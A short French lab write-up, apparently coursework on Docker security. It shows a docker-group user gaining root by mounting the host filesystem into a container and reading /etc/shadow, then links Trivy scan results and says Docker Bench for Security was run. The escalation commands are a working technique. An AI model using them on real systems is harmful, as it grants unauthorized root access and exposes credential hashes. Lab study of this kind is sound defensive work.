🌞 Prouvez que vous pouvez devenir root

Notre utilisateur est bien dans le groupe docker :
```
❯ whoami
carambole
❯ groups
carambole adm dialout cdrom floppy sudo audio dip video plugdev users netdev bluetooth wireshark lpadmin scanner kaboxer docker
```

On peu juste monter tout le système de fichier dans le docker :
```
❯ docker run -v /:/mnt -it ubuntu
Unable to find image 'ubuntu:latest' locally
latest: Pulling from library/ubuntu
5a7813e071bf: Pull complete 
Digest: sha256:72297848456d5d37d1262630108ab308d3e9ec7ed1c3286a32fe09856619a782
Status: Downloaded newer image for ubuntu:latest

root@a6eb3d85e55c:/# cat /mnt/etc/shadow
root:!:20126:0:99999:7:::
daemon:*:20126:0:99999:7:::
bin:*:20126:0:99999:7:::
sys:*:20126:0:99999:7:::
sync:*:20126:0:99999:7:::
[etc...]
```

🌞 Utilisez Trivy
- [scan wikijs](./scan_wikijs)
- [scan postgres](./scan_postgres)
- [scan nginx](./scan_nginx)

🌞 Utilisez l'outil Docker Bench for Security

Fait.
